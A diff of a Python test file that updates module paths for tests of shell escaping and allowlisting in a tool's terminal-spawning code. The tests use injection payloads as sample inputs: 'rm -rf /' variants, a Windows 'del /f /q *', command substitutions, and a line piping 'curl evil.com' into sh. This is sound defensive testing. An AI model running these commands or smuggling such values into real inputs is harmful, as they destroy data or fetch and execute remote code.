@@ -16,7 +16,7 @@ import pytest
 from pathlib import Path
 from unittest.mock import patch, MagicMock
 
-from spellbook.terminal_utils import _escape_for_applescript
+from spellbook.daemon.terminal import _escape_for_applescript
 
 
 def _expected_macos_applescript(terminal_type: str, prompt: str, wd: str, cli: str) -> str:
@@ -91,10 +91,10 @@ class TestAppleScriptEscaping:
 
     def test_subshell_in_prompt_is_escaped(self):
         """A prompt containing $(cmd) must be wrapped in shlex.quote single quotes."""
-        from spellbook.terminal_utils import spawn_macos_terminal
+        from spellbook.daemon.terminal import spawn_macos_terminal
 
         prompt = "$(echo pwned)"
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             result = spawn_macos_terminal(
                 terminal="terminal",
@@ -113,10 +113,10 @@ class TestAppleScriptEscaping:
 
     def test_semicolon_in_prompt_is_escaped(self):
         """A prompt containing semicolons must be shlex-quoted, preventing command chaining."""
-        from spellbook.terminal_utils import spawn_macos_terminal
+        from spellbook.daemon.terminal import spawn_macos_terminal
 
         prompt = '"; rm -rf / #'
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             result = spawn_macos_terminal(
                 terminal="terminal",
@@ -135,10 +135,10 @@ class TestAppleScriptEscaping:
 
     def test_backtick_in_prompt_is_escaped(self):
         """Backtick command substitution must be neutralized by shlex.quote."""
-        from spellbook.terminal_utils import spawn_macos_terminal
+        from spellbook.daemon.terminal import spawn_macos_terminal
 
         prompt = "`rm -rf /`"
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             result = spawn_macos_terminal(
                 terminal="terminal",
@@ -157,10 +157,10 @@ class TestAppleScriptEscaping:
 
     def test_working_directory_is_escaped(self):
         """working_directory with shell metacharacters must be shlex-quoted."""
-        from spellbook.terminal_utils import spawn_macos_terminal
+        from spellbook.daemon.terminal import spawn_macos_terminal
 
         malicious_wd = '/tmp/$(whoami)'
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             result = spawn_macos_terminal(
                 terminal="terminal",
@@ -179,10 +179,10 @@ class TestAppleScriptEscaping:
 
     def test_iterm2_uses_escaped_command(self):
         """iTerm2 AppleScript must use the escaped command in write text."""
-        from spellbook.terminal_utils import spawn_macos_terminal
+        from spellbook.daemon.terminal import spawn_macos_terminal
 
         prompt = "$(whoami)"
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=5678)
             result = spawn_macos_terminal(
                 terminal="iTerm2",
@@ -201,10 +201,10 @@ class TestAppleScriptEscaping:
 
     def test_warp_uses_escaped_command(self):
         """Warp AppleScript must use the escaped command in keystroke."""
-        from spellbook.terminal_utils import spawn_macos_terminal
+        from spellbook.daemon.terminal import spawn_macos_terminal
 
         prompt = "; curl evil.com | sh"
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=9999)
             result = spawn_macos_terminal(
                 terminal="Warp",
@@ -223,9 +223,9 @@ class TestAppleScriptEscaping:
 
     def test_popen_called_with_osascript(self):
         """subprocess.Popen must be called with ['osascript', '-e', script]."""
-        from spellbook.terminal_utils import spawn_macos_terminal
+        from spellbook.daemon.terminal import spawn_macos_terminal
 
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             spawn_macos_terminal(
                 terminal="terminal",
@@ -246,10 +246,10 @@ class TestLinuxTerminalEscaping:
 
     def test_prompt_is_shell_escaped_gnome(self):
         """User prompt must be escaped with shlex.quote for gnome-terminal bash -c."""
-        from spellbook.terminal_utils import spawn_linux_terminal
+        from spellbook.daemon.terminal import spawn_linux_terminal
 
         prompt = "$(echo pwned)"
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             result = spawn_linux_terminal(
                 terminal="gnome-terminal",
@@ -267,10 +267,10 @@ class TestLinuxTerminalEscaping:
 
     def test_working_directory_is_shell_escaped_linux(self):
         """working_directory must be shlex.quote'd in bash -c command."""
-        from spellbook.terminal_utils import spawn_linux_terminal
+        from spellbook.daemon.terminal import spawn_linux_terminal
 
         malicious_wd = "/tmp/$(id)"
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             result = spawn_linux_terminal(
                 terminal="xterm",
@@ -288,10 +288,10 @@ class TestLinuxTerminalEscaping:
 
     def test_semicolon_in_prompt_escaped_linux(self):
         """Semicolons in prompt must be neutralized by shlex.quote."""
-        from spellbook.terminal_utils import spawn_linux_terminal
+        from spellbook.daemon.terminal import spawn_linux_terminal
 
         prompt = "; rm -rf / ;"
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             result = spawn_linux_terminal(
                 terminal="konsole",
@@ -309,10 +309,10 @@ class TestLinuxTerminalEscaping:
 
     def test_terminator_double_escapes_command(self):
         """Terminator wraps the bash -c arg in shlex.quote for its -e flag."""
-        from spellbook.terminal_utils import spawn_linux_terminal
+        from spellbook.daemon.terminal import spawn_linux_terminal
 
         prompt = "$(evil)"
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             result = spawn_linux_terminal(
                 terminal="terminator",
@@ -334,10 +334,10 @@ class TestWindowsTerminalEscaping:
 
     def test_prompt_with_special_chars_wt(self):
         """Prompt with special characters must be properly escaped for Windows Terminal."""
-        from spellbook.terminal_utils import spawn_windows_terminal
+        from spellbook.daemon.terminal import spawn_windows_terminal
 
         prompt = 'test & del /f /q *'
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             result = spawn_windows_terminal(
                 terminal="windows-terminal",
@@ -356,10 +356,10 @@ class TestWindowsTerminalEscaping:
 
     def test_prompt_with_special_chars_pwsh(self):
         """Prompt with special characters must be properly escaped for PowerShell."""
-        from spellbook.terminal_utils import spawn_windows_terminal
+        from spellbook.daemon.terminal import spawn_windows_terminal
 
         prompt = 'test & del *'
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             result = spawn_windows_terminal(
                 terminal="pwsh",
@@ -380,10 +380,10 @@ class TestWindowsTerminalEscaping:
 
     def test_prompt_with_special_chars_cmd(self):
         """Prompt with special characters must be properly escaped for cmd."""
-        from spellbook.terminal_utils import spawn_windows_terminal
+        from spellbook.daemon.terminal import spawn_windows_terminal
 
         prompt = 'test & del *'
-        with patch("spellbook.terminal_utils.subprocess.Popen") as mock_popen:
+        with patch("spellbook.daemon.terminal.subprocess.Popen") as mock_popen:
             mock_popen.return_value = MagicMock(pid=1234)
             result = spawn_windows_terminal(
                 terminal="cmd",
@@ -474,7 +474,7 @@ class TestCLICommandAllowlist:
 
     def test_malicious_cli_command_falls_back_to_claude(self):
         """A CLI command not in the allowlist falls back to 'claude'."""
-        from spellbook.terminal_utils import _get_cli_command
+        from spellbook.daemon.terminal import _get_cli_command
 
         with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "rm -rf /; claude"}):
             result = _get_cli_command()
@@ -482,7 +482,7 @@ class TestCLICommandAllowlist:
 
     def test_valid_cli_commands_accepted(self):
         """All known CLI commands are accepted."""
-        from spellbook.terminal_utils import _get_cli_command
+        from spellbook.daemon.terminal import _get_cli_command
 
         for cmd in ["claude", "codex", "gemini", "opencode", "crush"]:
             with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": cmd}):
@@ -491,7 +491,7 @@ class TestCLICommandAllowlist:
 
     def test_path_based_cli_command_extracts_basename(self):
         """A full path to a known CLI is accepted by extracting basename."""
-        from spellbook.terminal_utils import _get_cli_command
+        from spellbook.daemon.terminal import _get_cli_command
 
         with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "/usr/local/bin/claude"}):
             result = _get_cli_command()
@@ -499,7 +499,7 @@ class TestCLICommandAllowlist:
 
     def test_path_to_unknown_command_falls_back(self):
         """A full path to an unknown command falls back to 'claude'."""
-        from spellbook.terminal_utils import _get_cli_command
+        from spellbook.daemon.terminal import _get_cli_command
 
         with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "/usr/local/bin/evil"}):
             result = _get_cli_command()
@@ -507,7 +507,7 @@ class TestCLICommandAllowlist:
 
     def test_default_is_claude(self):
         """Without env var, default is 'claude'."""
-        from spellbook.terminal_utils import _get_cli_command
+        from spellbook.daemon.terminal import _get_cli_command
 
         env = os.environ.copy()
         env.pop("SPELLBOOK_CLI_COMMAND", None)
@@ -517,10 +517,10 @@ class TestCLICommandAllowlist:
 
     def test_spawn_terminal_window_uses_validated_cli(self):
         """spawn_terminal_window must use _get_cli_command when cli_command is None."""
-        from spellbook.terminal_utils import spawn_terminal_window, _get_cli_command
+        from spellbook.daemon.terminal import spawn_terminal_window, _get_cli_command
 
         with patch.dict(os.environ, {"SPELLBOOK_CLI_COMMAND": "codex"}):
-            with patch("spellbook.terminal_utils.spawn_macos_terminal") as mock_spawn:
+            with patch("spellbook.daemon.terminal.spawn_macos_terminal") as mock_spawn:
                 with patch("sys.platform", "darwin"):
                     mock_spawn.return_value = {"status": "spawned", "terminal": "t", "pid": 1}
                     spawn_terminal_window("terminal", "hello", "/tmp")
@@ -533,11 +533,11 @@ class TestTerminalEnvAllowlist:
 
     def test_malicious_terminal_rejected(self):
         """An unknown $TERMINAL value that doesn't exist on PATH must be ignored."""
-        from spellbook.terminal_utils import detect_linux_terminal
+        from spellbook.daemon.terminal import detect_linux_terminal
 
         with patch.dict(os.environ, {"TERMINAL": "/tmp/evil"}):
             with patch("shutil.which", return_value=None):
-                with patch("spellbook.terminal_utils.subprocess.run") as mock_run:
+                with patch("spellbook.daemon.terminal.subprocess.run") as mock_run:
                     # Make the fallback detection also find nothing
                     mock_run.return_value = MagicMock(returncode=1)
                     result = detect_linux_terminal()
@@ -546,7 +546,7 @@ class TestTerminalEnvAllowlist:
 
     def test_known_terminal_in_env_accepted(self):
         """A known terminal in $TERMINAL that exists via which() must be accepted."""
-        from spellbook.terminal_utils import detect_linux_terminal
+        from spellbook.daemon.terminal import detect_linux_terminal
 
         with patch.dict(os.environ, {"TERMINAL": "alacritty"}):
             with patch("shutil.which", return_value="/usr/bin/alacritty"):
@@ -555,7 +555,7 @@ class TestTerminalEnvAllowlist:
 
     def test_full_path_to_known_terminal_accepted(self):
         """$TERMINAL=/usr/bin/gnome-terminal extracts basename and validates."""
-        from spellbook.terminal_utils import detect_linux_terminal
+        from spellbook.daemon.terminal import detect_linux_terminal
 
         with patch.dict(os.environ, {"TERMINAL": "/usr/bin/gnome-terminal"}):
             with patch("shutil.which", return_value="/usr/bin/gnome-terminal"):
@@ -564,11 +564,11 @@ class TestTerminalEnvAllowlist:
 
     def test_terminal_not_on_path_falls_through(self):
         """Even a reasonable-looking $TERMINAL must be rejected if which() fails."""
-        from spellbook.terminal_utils import detect_linux_terminal
+        from spellbook.daemon.terminal import detect_linux_terminal
 
         with patch.dict(os.environ, {"TERMINAL": "kitty"}):
             with patch("shutil.which", return_value=None):
-                with patch("spellbook.terminal_utils.subprocess.run") as mock_run:
+                with patch("spellbook.daemon.terminal.subprocess.run") as mock_run:
                     # gnome-terminal found in fallback cascade
                     def run_side_effect(cmd, **kwargs):
                         if 'gnome-terminal' in cmd:
@@ -580,10 +580,10 @@ class TestTerminalEnvAllowlist:
 
     def test_empty_terminal_env_uses_detection_cascade(self):
         """An empty $TERMINAL value must be treated as unset and use detection cascade."""
-        from spellbook.terminal_utils import detect_linux_terminal
+        from spellbook.daemon.terminal import detect_linux_terminal
 
         with patch.dict(os.environ, {"TERMINAL": ""}):
-            with patch("spellbook.terminal_utils.subprocess.run") as mock_run:
+            with patch("spellbook.daemon.terminal.subprocess.run") as mock_run:
                 def run_side_effect(cmd, **kwargs):
                     if 'konsole' in cmd:
                         return MagicMock(returncode=0)
@@ -594,12 +594,12 @@ class TestTerminalEnvAllowlist:
 
     def test_no_terminal_env_uses_detection_cascade(self):
         """Without $TERMINAL set, detection cascade runs normally."""
-        from spellbook.terminal_utils import detect_linux_terminal
+        from spellbook.daemon.terminal import detect_linux_terminal
 
         env = os.environ.copy()
         env.pop("TERMINAL", None)
         with patch.dict(os.environ, env, clear=True):
-            with patch("spellbook.terminal_utils.subprocess.run") as mock_run:
+            with patch("spellbook.daemon.terminal.subprocess.run") as mock_run:
                 def run_side_effect(cmd, **kwargs):
                     if 'konsole' in cmd:
                         return MagicMock(returncode=0)
